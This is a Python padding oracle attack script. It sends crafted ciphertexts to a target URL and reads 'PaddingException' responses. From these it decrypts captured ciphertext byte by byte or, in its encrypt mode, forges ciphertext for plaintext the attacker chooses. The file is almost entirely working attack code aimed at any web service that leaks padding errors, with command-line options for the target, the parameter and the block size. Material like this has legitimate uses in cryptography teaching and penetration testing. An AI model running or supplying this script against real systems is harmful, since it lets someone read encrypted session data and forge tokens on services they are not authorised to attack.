#!/usr/bin/env python3

import constants
import argparse
import base64
import re
import requests
import time
import sys

from random import seed
from random import randint

################################################################################
## Global vars
debug =                 False
url =                   None
ciphertext_param_name = None
method =                None
session =               None

################################################################################
## Helper functions to chain encoding / decoding with additional transformations

def transform (text):
  return text.replace("=", "~").replace("/", "!").replace("+", "-")

def reverse (text):
  return text.replace("~", "=").replace("!", "/").replace("-", "+")

def b64encode (payload):
  return transform(base64.b64encode(payload).decode(constants.ENCODING))

def b64decode (payload):
  return base64.b64decode(reverse(payload))


################################################################################
## Auxiliary functions

def fail (message, exit_code = 1):
  print (message, sys.stderr)
  exit(exit_code)

def response_contains_padding_exception (text):
  return re.search(".*PaddingException.*", text)

# wrap request in a try block to handle ConnectionError exceptions
# method is either the get() or post() method of a requests.sessions.Session object
def try_request (ciphertext):
  wait = 0.3
  for i in range(0, 6):
    try:
      params = {ciphertext_param_name: ciphertext}
      if method == constants.GET:
        return session.get(url, params = params)
      else:
        return session.post(url, data = params)
      return resp
    except requests.ConnectionError:
      time.sleep(wait)
      wait *= 2
  fail("Maximum retries for request exceeded. Blowing up")


################################################################################
## Main

def main(args):
  global debug
  global url
  global ciphertext_param_name
  global method
  global session

  debug =                       args.debug
  method =                      args.method
  url =                         args.url
  block_size =                  args.block_size
  ciphertext_param =            args.ciphertext_param.split("=")
  ciphertext_param_name =       ciphertext_param[0]
  ciphertext =                  ciphertext_param[1]
  encrypt_mode =                False

  # Following variables only used in encryption mode
  wanted_plaintext_bytes =      None
  wp_len =                      None
  wp_n_blocks =                 None
  wanted_ciphertext_bytes =     None
  wc_len =                      None
  c_diff_len =                  None
  pad_len =                     None
  pad_bytes =                   None

  ciphertext_bytes =            bytearray(b64decode(ciphertext))
  c_len =                       len(ciphertext_bytes)
  if (c_len % block_size) != 0:
    fail(f"Ciphertext length must be a multiple of {block_size}")
  c_n_blocks =                  c_len // block_size

  seed(1337)
  dummy_block =                 bytearray(randint(0, 255) for i in range(0, block_size))
  decrypted_plaintext_bytes =   bytearray([0] * (c_len - block_size))
  if args.plaintext is not None:
    encrypt_mode =              True
    pad_len =                   block_size - (len(args.plaintext) % block_size)
    pad_bytes =                 bytearray([pad_len] * pad_len)
    wanted_plaintext_bytes =    bytearray(args.plaintext, constants.ENCODING) + pad_bytes
    wp_len =                    len(wanted_plaintext_bytes)
    wp_n_blocks =               wp_len // block_size
    wanted_ciphertext_bytes =   bytearray(dummy_block * (wp_n_blocks + 1))
    wc_len =                    len(wanted_ciphertext_bytes)
    c_diff_len =                c_len - wc_len

  if debug:
    print(f"\n===== Ciphertext bytes, length {c_len}:\n{ciphertext_bytes}")
    if encrypt_mode:
      print(f"\n===== Wanted plaintext, length {wp_len}, padding included:\n{wanted_plaintext_bytes}")
      print(f"\n===== Encryption of wanted plaintext will have length of {wc_len} bytes")


  ##### Perform the padding oracle attack

  session = requests.session()
  n_start = c_n_blocks - 1
  n_stop =  c_n_blocks - wp_n_blocks - 1 if encrypt_mode else 0

  for i in range(n_start, n_stop, -1):
    fb =                        i * block_size
    lb =                        fb + block_size
    intermediate_bytes =        bytearray([0] * block_size)
    guess_bytes =               None
    if encrypt_mode:
      if i == n_start:
        guess_bytes =           ciphertext_bytes[fb - block_size:fb] + dummy_block
      else:
        guess_bytes =           ciphertext_bytes[fb - block_size:fb] + wanted_ciphertext_bytes[fb - c_diff_len:lb - c_diff_len]
    else:
      guess_bytes =             dummy_block + ciphertext_bytes[fb:lb]

    print(f"\n=== Fiddling with block {i - 1}")

    for b in range(1, block_size + 1):
      i_cursor = block_size - b
      c_cursor = fb - b
      if debug:
        print(f"i: {i_cursor}, c: {c_cursor}, p: {c_cursor}")

      for k in range(1, b):
        guess_bytes[block_size - k] = b ^ intermediate_bytes[block_size - k]

      for j in range(0, 256):
        guess_bytes[block_size - b] = j
        response = try_request(b64encode(guess_bytes))
        if not response_contains_padding_exception(response.text):
          intermediate_bytes[i_cursor] = j ^ b

          print(f"Found match: {j}")
          if encrypt_mode:
            wc_cursor = c_cursor - c_diff_len
            wanted_ciphertext_bytes[wc_cursor] = wanted_plaintext_bytes[wc_cursor] ^ intermediate_bytes[i_cursor]
            print(f"E(P)[{wc_cursor}] = {wanted_ciphertext_bytes[wc_cursor]}")
          else:
            decrypted_plaintext_bytes[c_cursor] = ciphertext_bytes[c_cursor] ^ intermediate_bytes[i_cursor]
            print(f"P[{c_cursor}] = {decrypted_plaintext_bytes[c_cursor]}")

          break

    if encrypt_mode:
      print("\nEncryption of plaintext:\n%s" % bytes(wanted_ciphertext_bytes[fb - c_diff_len - block_size:]))
    else:
      print("\nDecrypted plaintext:\n%s" % decrypted_plaintext_bytes[fb - block_size:].decode(constants.ENCODING))


if __name__ == '__main__':

  parser = argparse.ArgumentParser(
      description = '''
##### Padding Oracle Attack script #####

''',
      formatter_class = argparse.RawTextHelpFormatter)

  parser.add_argument(
      "method",
      help =        "HTTP request method",
      choices =     [constants.GET, constants.POST])
  parser.add_argument(
      "url",
      help =        "Target URL")
  parser.add_argument(
      "block_size",
      help =        "Cipher block size",
      type =        int)
  parser.add_argument(
      "ciphertext_param",
      help =        "Request parameter that takes the ciphertext value. Format: name=ciphertext")
  parser.add_argument(
      '-p', '--plaintext',
      help =        "Plaintext to encrypt. Setting the plaintext will enter \"Encrypt\" mode")
  parser.add_argument(
      '-D', '--debug',
      help =        "Debug mode",
      action =      "store_true"
      )

args = parser.parse_args()
main(args)
